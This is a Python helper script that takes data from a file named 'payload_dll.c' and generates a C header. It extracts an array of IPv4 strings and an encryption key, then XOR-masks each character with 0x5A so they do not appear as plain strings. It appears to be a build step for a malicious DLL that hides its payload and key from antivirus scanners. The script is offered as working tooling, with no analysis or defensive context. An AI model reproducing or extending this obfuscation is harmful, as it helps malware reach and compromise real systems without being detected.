#!/usr/bin/env python3
"""
Reads payload_dll.c, extracts IPv4 strings and encryption key,
generates payload_data.h with XOR-encrypted (0x5A) data.
"""

import re
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
INPUT_FILE = os.path.join(SCRIPT_DIR, "payload_dll.c")
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "payload_data.h")

XOR_KEY = 0x5A
IPV4_ENTRY_LEN = 16  # each IPv4 entry padded to 16 bytes


def extract_ipv4_list(content):
    """Extract all IPv4 strings from ipv4_array[]."""
    # Find the array block between { and };
    match = re.search(r'char\*?\s+ipv4_array\s*\[\s*\]\s*=\s*\{(.*?)\};', content, re.DOTALL)
    if not match:
        raise ValueError("Could not find ipv4_array[] in source file")
    body = match.group(1)
    # Extract all quoted strings
    ips = re.findall(r'"(\d+\.\d+\.\d+\.\d+)"', body)
    if not ips:
        raise ValueError("No IPv4 strings found in ipv4_array[]")
    return ips


def extract_encryption_key(content):
    """Extract the encryption key string from GetEncryptionKey()."""
    match = re.search(r'GetEncryptionKey\s*\(\s*\)\s*\{[^"]*\"([^\"]+)\"', content)
    if not match:
        raise ValueError("Could not find encryption key in GetEncryptionKey()")
    return match.group(1)


def char_xor_expr(ch):
    """Return C expression for a character XOR'd with 0x5A."""
    return f"'{ch}'^{XOR_KEY:#04x}"


def generate_ipv4_entry(ip_str):
    """Generate one IPv4 entry line like the example format."""
    parts = []
    for ch in ip_str:
        parts.append(char_xor_expr(ch))
    # Pad with 0^0x5A to fill 16 bytes
    while len(parts) < IPV4_ENTRY_LEN:
        parts.append(f"0^{XOR_KEY:#04x}")
    return f"/* {ip_str} */ {{ {','.join(parts)} }}"


def generate_key_entry(key_str):
    """Generate the enc_key[] array entries."""
    parts = []
    for ch in key_str:
        parts.append(char_xor_expr(ch))
    # Terminator: 0^0x5A
    parts.append(f"0^{XOR_KEY:#04x}")
    return ", ".join(parts)


def main():
    with open(INPUT_FILE, "r", encoding="utf-8") as f:
        content = f.read()

    ipv4_list = extract_ipv4_list(content)
    enc_key = extract_encryption_key(content)
    ipv4_count = len(ipv4_list)

    lines = []
    lines.append("#ifndef PAYLOAD_DATA_H")
    lines.append("#define PAYLOAD_DATA_H")
    lines.append("")
    lines.append(f"#define IPV4_COUNT {ipv4_count}")
    lines.append("")
    lines.append(f"static const BYTE enc_key[] = {{ {generate_key_entry(enc_key)} }};")
    lines.append("")
    lines.append(f"static const BYTE enc_ipv4[IPV4_COUNT][{IPV4_ENTRY_LEN}] = {{")
    for ip in ipv4_list:
        lines.append(f"    {generate_ipv4_entry(ip)},")
    lines.append("};")
    lines.append("")
    lines.append("#endif /* PAYLOAD_DATA_H */")
    lines.append("")

    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    print(f"Generated {OUTPUT_FILE}")
    print(f"  IPv4 count: {ipv4_count}")
    print(f"  Encryption key: {enc_key}")


if __name__ == "__main__":
    main()
